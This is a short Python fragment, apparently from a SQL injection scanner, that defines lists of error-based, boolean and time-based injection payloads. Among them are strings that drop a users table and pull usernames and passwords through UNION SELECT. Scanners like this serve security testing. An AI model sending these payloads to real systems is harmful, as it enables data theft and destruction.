ERROR_BASED_PAYLOADS = [
    "1 OR 17-7=10",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "'; DROP TABLE users;--",
    "' UNION SELECT NULL--",
    "' UNION SELECT username, password FROM users--",
    "'", "'--", "'#", "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
]

BOOLEAN_PAYLOADS = {
    "true": "' AND 1=1--",
    "false": "' AND 1=2--",
}

TIME_BASED_PAYLOADS = [
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "'; SELECT SLEEP(5)--"
]
